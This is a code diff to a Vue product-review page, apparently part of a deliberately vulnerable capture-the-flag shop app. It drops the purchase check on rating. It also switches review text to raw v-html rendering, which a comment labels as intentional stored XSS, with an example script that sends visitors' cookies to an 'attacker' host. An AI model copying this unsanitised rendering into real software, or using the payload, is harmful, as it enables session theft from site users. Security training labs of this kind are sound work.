@@ -49,11 +49,11 @@ onMounted(async () => {
     const productId = route.params.id
     const [statsRes, reviewsRes] = await Promise.all([
       client.get(`/ratings/product/${productId}/stats`).catch(() => ({ data: null })),
-      client.get(`/ratings/product/${productId}`).catch(() => ({ data: { ratings: [] } })),
+      client.get(`/ratings/product/${productId}`).catch(() => ({ data: [] })),
     ])
     
     ratingStats.value = statsRes.data
-    reviews.value = reviewsRes.data?.ratings || []
+    reviews.value = reviewsRes.data || []
     
     if (isLoggedIn.value) {
       const [myRatingRes] = await Promise.all([
@@ -159,7 +159,7 @@ async function submitRating() {
       client.get(`/ratings/product/${route.params.id}`),
     ])
     ratingStats.value = statsRes.data
-    reviews.value = reviewsRes.data?.ratings || []
+    reviews.value = reviewsRes.data || []
   } catch (e) {
     ratingMessage.value = e.response?.data?.detail || 'Failed to submit rating'
   } finally {
@@ -531,7 +531,7 @@ function getRatingBarWidth(stars) {
               </div>
 
               <!-- Rate This Product -->
-              <div v-if="isLoggedIn && canRate" class="py-6 border-b border-loopymart-gray-dark">
+              <div v-if="isLoggedIn" class="py-6 border-b border-loopymart-gray-dark">
                 <h3 class="font-medium text-text-primary mb-4">
                   {{ myRating ? 'Update Your Rating' : 'Rate This Product' }}
                 </h3>
@@ -576,16 +576,12 @@ function getRatingBarWidth(stars) {
                   v-if="ratingMessage" 
                   :class="[
                     'mt-2 text-sm',
-                    ratingMessage.includes('Failed') ? 'text-red-500' : 'text-loopymart-green'
+                    ratingMessage.includes('Failed') || ratingMessage.includes('only rate') || ratingMessage.includes('purchased')
+                      ? 'text-red-500' 
+                      : 'text-loopymart-green'
                   ]"
                 >
                   {{ ratingMessage }}
-                </p>
-              </div>
-
-              <div v-else-if="isLoggedIn && !canRate" class="py-6 border-b border-loopymart-gray-dark">
-                <p class="text-text-secondary text-sm">
-                  Purchase and receive this product to leave a rating.
                 </p>
               </div>
 
@@ -629,9 +625,13 @@ function getRatingBarWidth(stars) {
                         }) }}
                       </span>
                     </div>
-                    <p v-if="review.review" class="text-sm text-text-primary">
-                      {{ review.review }}
-                    </p>
+                    <!-- ⚠️ INTENTIONALLY VULNERABLE – CTF: Stored XSS
+                         review.review is rendered as raw HTML with no sanitization.
+                         A malicious comment containing <script>document.location='http://attacker/?c='+document.cookie</script>
+                         executes in every visitor's browser, stealing their JWT from localStorage / cookies.
+                         CWE-79: Improper Neutralization of Input During Web Page Generation
+                    -->
+                    <p v-if="review.review" class="text-sm text-text-primary" v-html="review.review"></p>
                   </div>
                 </div>
               </div>
